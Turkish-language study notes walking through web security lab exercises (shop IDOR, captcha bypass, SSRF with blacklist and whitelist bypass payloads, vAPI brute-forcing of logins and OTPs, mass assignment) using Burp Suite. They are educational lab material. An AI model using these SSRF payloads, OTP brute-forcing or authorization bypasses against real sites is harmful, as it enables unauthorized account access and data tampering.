![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.00.18.jpeg)

> ## Captcha ByPass

- Kullanıcı feedback'lerini 10'dan fazla kez 10 saniyede submit etmeyi deniyoruz
- Sağ tıklayıp ```inspect``` diyoruz. ```Network``` içinde ```/rest/captha/``` içinde feedback kısmında sorulan matematik işlemleri vardır
- Her işlemin kendi id'si vardır, o id'ye göre hazır işlemler ve cevapları gelir
- ```Burpsuite intercept is on``` yapıyoruz
- Parametrelerimizi görene kadar forward'lıyoruz
- Parametrelerimizi görünce sağ tıklayıp ```send to repeater``` diyoruz
- Sürekli "send"liyoruz, bu sayede kısa sürede bir çok feedback yollamış oluyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.27.17.jpeg)

> ## Başkasının Sepetine Ürün Eklemek

- Başkasının sepetine ürün değiştirmeyi yani yollanan ```request```'i değiştirmeyi deniyoruz
- ```Burpsuite intercept is on``` diyoruz ve sepetimize bişey ekliyoruz
- Sepetdeki ürün parametrelerini görene kadar forward'lıyoruz
- Parametrelerimizi görünce ```send to repeater``` diyoruz
- ```Request``` kısmına ```Basket Id:"2"``` ekliyoruz ve "send"'liyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.40.47.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.46.21.jpeg)

- Bu şekilde id'si 2 olan kullanıcının sepetine ürün ekliyoruz 2 yerine başka sayı girerek başka kullanıcıların sepetine de ekleyebiliriz

> ## Başka Kullanıcı Adına Feedback Vermek

### Burpsuite

- Başka kullanıcı olarak feedback verirken kullanılabilecek yöntemlerden birisi ```Burpsuite``` kullanmaktır
- Gerekli yerleri dolduruyoruz ```Burpsuite intercept is on``` diyoruz ve submit ediyoruz
- Bilgilerimizi görene kadar forward'lıyoruz
- ```UsedId``` değiştiriyoruz ve forwardlıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.52.31.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.52.42.jpeg)

### HTML Kaynak Kodu

- HTML kodlarını değiştirerek de başka kullanıcı olarak feedback verebiliriz
- Sağ tıklayıp ```inspect``` diyoruz
- HTML kodlarında değiştiremediğimiz mail kısmını buluyoruz
- ```Input Id``` kodu içerisinde ```hidden``` yani gizlenmiş bişeyler var

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2016.59.11.jpeg)

- Bu kısımı siliyoruz
- Artık feedback kısmında Id'miz göründü, burayı değiştirererk başkası adına yorum yapabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.01.57.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.02.10.jpeg)

> ## Başka Kullanıcı Adına Yorum Yapmak

- ```Burpsuite intercept is on``` yapıyoruz ve ürün hakkında yorum yapıyoruz
- ```Burpsuite```'de parametrelerimizi görene kadar forwardlıyoruz
- Kullanıcı parametrelerini görünce ```author``` kısmının değiştirerek başkası adına yorum yapabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.03.46.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.03.19.jpeg)

> ## Eksi Sipariş Vermek

- Sitedeki bir üründen "-" tane sipariş vermeyi deniyoruz 
- ```Burpsuite intercept is on``` diyoruz
- Sepete ürün ekliyoruz ve yakalıyoruz
- Sepetimizle ilgili parametreleri görene kadar forwardlıyoruz
- Parametreler içinde ```quantity```'i değiştiriyoruz (-200 yapıyoruz) ve forwardlıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.16.15.jpeg)

- Artık sepetimizde "-200" tane ürün bulunmakta

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.16.32.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/51191900139fadefaf7aaa5a294782f22f30c57c/Pictures/WhatsApp%20Image%202022-09-18%20at%2017.15.47.jpeg)

# OWASP Top 10 2021

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/3fa5e4d85b99bda63369d1e84b35c155b6832a41/Pictures/WhatsApp%20Image%202022-09-20%20at%2000.10.49.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2022.11.53.jpeg)

# SSRF

- Server tarafında gönderilen isteklerin değiştirilmesidir
- Bulunması zor bir açıktır
- Admin işleri yapabilir, admin paneline ulaşabilir, kullanıcı oluşturup silebilir vb işlemler yapabiliriz
- Eğer linux sunucusunda ayarlamalar düzgün yapılmazsa başka PC'lerde bu sunucuya erişim sağlayıp işlemler yapabiliriz

> ## SSRF Admin Paneline Ulaşma

- Siteye giriyoruz 
- ```Burpsuite intercept is on``` yapıyoruz
- Stock check yapıp yakalıyoruz
- ```Send to repeater``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2000.39.31.jpeg)

- ```stockApi=hhtp://localhost/admin``` olarak değiştiriyoruz ve send diyoruz
- ```Proxy``` kısmındaki "stockApi"'yide değiştiriyoruz ve forward'lıyoruz
- Ve admin paneline ulaşıyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2000.41.37.jpeg)

- "Carlos" kişisini silmek için
- ```Burpsuite intercept is on``` diyoruz, delete diyip yakalıyoruz
- ```stockApi=http://localhost/admin/delete?username=carlos``` diyoruz ve forward'lıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2000.47.56.jpeg)

- Carlos kullanısını sildik

> ## SSRF Backend Saldırısı

- Sitede SSRF açığı varsa sitenin admin paneline ulaşabiliriz
- Hangi IP adresinden admin paneline ulaşabileceğimizi bilmiyoruz ve ```brute force``` yaparak o IP adresini bulmayı deniyoruz
- Siteyi açıyoruz
- ```Burpsuite intercept is on``` yapıyoruz
- Stock check yapıp yakalıyoruz
- Yakaladıktan sonra sağ tıklayıp ```send to intruder``` diyoruz
- "Clear" diyerek bütün parametreleri temizliyoruz
- ```stockApi=http://192.168.0.1:8080/admin``` yazıp "1"'i seçiyoruz ve "add" diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2018.48.30.jpeg)

- ```Payloads``` kısmına giriyoruz, ```payloads```'ı ```number``` seçiyoruz
- ```Form:1 To:255 Step:1 (kaçar kaçar arttığı)``` olarak ayarlıyoruz ve ```Attack``` diyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2018.48.45.jpeg)

- ```192.168.0.1/admin'den 192.168.0.255/admin```'e kadar tek tek deniyor
- ```Status```larına bakıyoruz, "200" olan bizim aradığımız URL'dir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2019.33.53.jpeg)

- Siteye giriyoruz
- ```Burpsuite intercept is on``` diyip yakalıyoruz
- ```stockApi=hhtp://192.168.0.157:8080/admin``` yazarak admin paneline ulaşabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2019.34.04.jpeg)

- ```stockApi=http://192.168.0.157:8080/admin/delete?username=carlos``` diyerek carlos kullanıcısını silebiliriz

> ## SSRF Blacklist

- Blacklist'e alınan şeyler site içerisinde çalıştırılmaz
- Bu örnekte "localhost", "127.0.0.1" vb şeyler blackliste alınmıştır ve açılmaz
- Siteye giriyoruz
- ```Burpsuite intercept is on``` yapıyoruz
- Stockcheck yapıyoruz ve yakalıyoruz
- ```stockApi=http://localhost/admin``` yazıp forward'lıyoruz ve "localhost" blacklist'e alındığı için hata alıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.06.59.jpeg)

- Sonuçları daha çabuk görmek için ```send to repeater``` diyoruz
- ```stockApi=http://127.0.0.1/admin``` yazıp deniyoruz
- ```stockApi=http://127.1/admin``` deniyoruz
- URL içindeki birşeyleri değiştirmeyi deniyoruz
- ```Decoder```'e giriyoruz ve ```admin```'i URL'ye çevirmeyi deniyoruz 
- ```admin -> %61%64%6d%69%6e``` olarak çevirip ```stockApi=http://127.1/%61%64%6d%69%6e``` olarak deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.11.13.jpeg)

-  ```admin```'i 2 kere URL'ye çevirmeyi deniyoruz 
-  ```admin -> %61%64%6d%69%6e -> %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65```'e çeviriyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.14.41.jpeg)

-  ```stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65``` olarak deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.18.34.jpeg)

- ```!! "admin"'in hepsini değil 1 harfini 2 kere URL encode ederek yazıp deneyebiliriz (stockApi=http://127.1/%25%36%31dmin)```

> ## SSRF Whitelist

- Whitelist'te sadece izin verilen bazı şeyler kabul ediliyor
- Çözmesi blacklist'e göre daha zordur
- Siteye giriyoruz
- ```Burpsuite intercept is on``` diyoruz
- Stock check yapıp yakalıyoruz
- Yakaladıktan sonra ```sent to repeater``` diyoruz
- ```stockApi=http://localhost/admin``` deniyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/83d057bb80879f0f5481798236c983be6fee0b6f/Pictures/WhatsApp%20Image%202022-09-20%20at%2021.23.35.jpeg)

- isteğin "stock.weliketoshop.net"'den gelmesi gerekiyor hatası alıyoruz
- ```stockApi=http://stock.weliktetoshop.net/admin``` olarak deniyoruz ve farklı bir hata alıyoruz
- ```stockApi=http://localhost:80#@stock.weliktetoshop.net/admin``` deniyoruz 
- "#"'i 2 kere URL encode yapıp deniyoruz
- ```stockApi=http://localhost:80%25%32%33@stock.weliktetoshop.net/admin``` deniyoruz ve admin paneline ulaşıyoruz

# API Güvenliği

- API (application programming interface) uygumala programlama arayüzü

# Digital Ocean Sunucu Oluşturma

- Ücretli olarak [digital ocean](https://www.digitalocean.com/) sitesinden sunucu kurabiliriz
- Kayıt olup panele giriş yapıyoruz
- ```New project``` diyeterk yeni proje oluşturuyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2011.50.23.jpeg)

- İsim vs girip tamamlıyoruz
- ```Create a Droplet``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2011.51.44.jpeg)

- Kali linux için ```ubuntu```'yu seçiyoruz
- ```CPU options```'u seçiyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2011.52.39.jpeg)

- Sunucunun nerede olacağını seçiyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2011.53.30.jpeg)

- Sunucuya ne ile bağlanıcağımızı seçiyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2011.53.59.jpeg)

- Ve ```create droplet``` diyoruz
- Oluşturduğumuz server'ın IP adresini görüyoruz
- Linux'den terminalimizi açıyoruz
- ```ssh root@{IP adresimiz}``` ile giriş yapıyoruz
- Giriş şeklimizi parola seçitysek parolamızı giriyoruz ve sunucumuza giriş yapıyoruz
- ! Sunucuyu kapatmak için digital ocean içinde ```droplets```'a girip "..."'a tıklayıp ```destroy``` dememiz yeterli oluyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2013.02.44.jpeg)

> ## Sunucuya API Kurulumu

- [vAPI](https://github.com/atilsama- [ncioglu/vapi) linki kopyalıyoruz
- Terminalden sunucuya giriş yaptıktan sonra  ```cd/var/www/html``` diyoruz ve dosya yok hatası alıyoruz yani sunucuda ```apache2``` yok
- Sunucu içinden ```/var``` klasörüne giriyoruz
- ```apt install apache2``` diyip yüklüyoruz
- Eğer hata alırsak ```apt update --fix-missing``` çalıştırıyoruz ve hem apt'i güncelleyip hem de hata varsa onu düzeltiyoruz
- Yükledikten sonra ```cd/var/www/html``` içine giriyoruz
- ```git clone https://github.com/atilsamancioglu/vapi.git``` diyerek yüklüyoruz
- Terminalde sunucu içindeyken ```docker-compose up -d``` çalıştırıyoruz
- Sunucuda ```Docker-Compose``` yoksa ```apt install docket-compose``` diyoruz
- "80" portunu başka birisi kullanıdğı için docker çalıştıramayabiliriz
- ```lsof -i :80``` çalıştırarak 80 portunu kimin kullandığını görürüz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2012.58.29.jpeg)

- ```kill {PID numarası}``` yazarak onu kapatıyoruz
- ```docker-compose up -d``` çalıştırıyoruz
- ```ifconfig``` çalıştırıyoruz ve ```eth0 -> inet IP``` kça ise o IP adresine herhangi bir PC'den giriş yaparak gidebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2013.00.27.jpeg)

- Site URL'sinin sonuna ```IP/vapi``` yazarak sitenin vapi kısmına gidebiliriz
- vAPI içerisinde challange'lar bulunur, bunları çözmek için ```postman``` ve ```burpsuite``` kullanılır

# Postman

- API ile çalışırken istek attığımız ve cevapları gördüğümüz uygulamadır
- Burpsuite ile farkı Postman'de istekleri atıp, parametre ve headerları düzgünce girip yanıtları almamızdır
- [Postman](https://www.postman.com/) adresine gidiyoruz
- Postman'i hem online olarak hem de bilgisayarımıza kurarak kullanabiliriz
- Linux sanal makinemize değil kendi kişisel bilgisayarımızada kurabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2013.39.36.jpeg)

- Postman'i kurduktan sonra ```collectionsa``` kısmından ```import``` diyerek ```.json``` dosyasını import edebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-23%20at%2013.43.42.jpeg)

- ```Collections``` içine girip daha hızlı post ve get isteği yollayabiliriz
- ```Enviroments``` içindeki ```host``` kısmına sitemizin IP adresini yazıyoruz ve bu sayede collections içindeki tüm isteklere tek tek yazmamız gerekmiyecektir
- ```Post: Kullanıcı Oluşturulacak```
- ```Get: Kullanıcı Bilgileri Sorgulanacak```
- ```Put: Kullanıcı Bilgileri Güncellenicek```
- ```Header``` çok genel bilgileri yer alır, değiştirmeye gerek yoktur

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2015.47.07.jpeg)

- ```Body```'de bazı parametreler yer alır
- ```Send``` diyerek isteği yapabiliriz ve geri dönüşü görebiliriz
- Bazu websiteleri bazı API'lerin dökümantasyonlarını detaylı olarak verebilir
- Dökümantasyondaki bilgileri ```Postman```'e yazıp istek atabilir ve açık var mı bakabiliriz

# vAPI CTF

> ## API1 Broken Object Authorization

- Post içine girip ```Body``` kısmını doldurup yolluyoruz ve yeni bir kullanıcı oluşturuyoruz, bize bir ID tanımlıyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2015.47.44.jpeg)

![](![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2015.57.58.jpeg))

- Get User içine giriyoruz ```header``` içindeki ```Authorization Token``` eğer yeni bir token olmasaydı açık var demektir
- Aynı ```Authorization Token```'ı kullanarak eğer diğer ID bilgilerine ulaşabiliriz. Bu bir açıktır. Authorization Token ile ID'nin aynı olması ve birbirine eşlenmesi gerekir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.04.05.jpeg)

> ## API2 Broken Authentication

- Post ve Get isteklerine bakıyoruz
- ```Authorization Token```'ı almak için e-mail ve şifre giriyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.07.26.jpeg)

- Post bilgilerini girip send'liyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.09.28.jpeg)

- Şifrenin veya kullanıcı adının yanlış olduğunu görüyoruz
- Bu örnekte bir websitesi hacklenmiş, veriler ele geçirilmiş, bütün kullanıcılar bilgilerini değiştirmiş ancak bazı kullanıcılar değiştirmedi ```brute force``` yaparak bu kullanıcıyı bulmayı deneyeceğiz
- ```Postman``` settings'e giriyoruz ve ```proxy``` içine "127.0.0.1" ve post'u "8080" portunu seçiyoruz
- ```Burpsuite intercept is on``` yapıyoruz
- Postman'den isteği yollayıp burpsuite'den yakalıyoruz
- ```Send to ıntruder``` diyoruz
- ```Attack type```'ı ```pitchfork``` seçiyoruz
- ```Payloads```'a girip 1'e mail adreslerini ve 2'ye eski şifreleri yazıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.16.40.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.16.49.jpeg)

- ```Start Attack``` diyoruz ve saldırı başlıyor
- ```Status``` "200" olan hesap bizim aradığımız hesaptır

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.18.43.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.19.08.jpeg)

- ```Response``` kısmından ```token```'ı görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.19.47.jpeg)

- ```Get``` kısmına giriyoruz Aut. Token otomatik olarak değişmişse send diyoruz ve diğer bilgileri görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.23.00.jpeg)

- Burdaki açık üst üste istek atmak engellenmemiştir ve Brute force saldırısı yapılabiliyor

> ## API4 İki Faktörlü Doğrulama

- Kullanıcı adı ve şifreyi girsek bile mail, sms ile gelen kodu girmemiz gerekiyor
- Telefon numaramızı giriyoruz ve send diyoruz
- O numaraya OTP (4 haneli kod) yolladık
- ```Verify OPT``` içine giriyoruz ```OTP``` bilgilerini girip deniyoruz ancak bunu tek tek deneyerek bulmamız çok zordur
- ```Burpsuite``` açıyoruz
- Proxy'i açıyoruz
- ```Burpsuite intercept is on``` diyip tekrar OTP'yi yolluyoruz ve yakalıyoruz
- Sağ tıklayıp ```send to intruder``` diyoruz
- Payloads'ı ```number``` yapıyoruz
- ```Payloads options```'ı "from" 1001, "to" 9999, "send" 1 diyoruz
- ```Start attack``` diyoruz ```status```'u "200" görene kadar bekliyoruz
- Ve telefona gelen 4 haneli kodu buluyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.39.56.jpeg)

- Postman'e dönüyoruz
- OTP yerine bulduğumuz kodu yazıyoruz ve ```token```'ı görebiliyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.41.07.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/25a515f231561477d9b77d1dfd7b0a8b8e7ef977/Pictures/WhatsApp%20Image%202022-09-24%20at%2016.45.54.jpeg)

- ```Get Details``` kısmına girip "send" diyerek bilgileri görebiliriz
- Bu açığı engellemek, brute force yapılmaması için ```Rate Limit``` olması gerekiyor

> ## API5 Broken Function Level Authorization

- Yeni kullanıcı oluşturabiliyoruz ve detayları almaya çalışacağız
- Post kısmından bilgierimizi giriyoruz ve bize ID veriyor (ID:2)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.45.22.jpeg)

- Get kısmından bilgilerimizi send'liyoruz ve bize ```auth. token``` veriyor
- Biz ID:1'e gitmeye çalışacağız

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.47.00.jpeg)

- ID'yi 1 yapıp send'liyoruz ancak hata alıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.47.04.jpeg)

- ```Burpsuite intercept is on``` yapıyoruz, bilgilerimizi send'liyoruz ve yakalıyoruz
- Yakaladıktan sonra sağ tıklayıp ```send to repeater``` diyip deniyoruz
- ```Users``` deniyoruz ve bulduk admin'in detaylarını elde edebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.49.21.jpeg)

- Burdaki hata ID:1'in ```auth. token```'ı ile başka ID'ye istek atabiliyor olmamızdır
- Deneyerek bulamasaydık ```brute force``` yapabilirdik

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.51.18.jpeg)

- Wordlistileri ekleyerek saldırı başlatabiliriz ve bu şekilde bulabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.52.01.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.52.23.jpeg)

> ## API6 Mass Assignment

- Post kısmından yine yeni bir kullanıcı oluşturacağız 
- Bilgilerimizi doldurup send'liyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.54.56.jpeg)

- Cevap geliyor ve bize User ID:2 veriyor
- Normalde yeni kullanıcının ```0``` kredisi olmalı biz yeni kullanıcı oluşturup ```500``` kredi vermeyi deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.59.24.jpeg)

- Post içinden yeni bir kullanıcı daha oluştururken 
- ```{
      "name":"ahmet",
      "username":"ahmetu",
      "password":"ahmet123",
      "credit":"500"
      }```
- ```credit:500``` ekliyoruz ve send diyoruz
- Get kısmına geldiğimizde ```credit```'imizin 500 olduğunu görürürz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2014.59.09.jpeg)

- Bu şekilde başka parametreler ekleyebiliriz ("admin":"true" vb)
- İsteği ```burpsuite```'den yakalayarak yeni parametre ekleyebiliriz

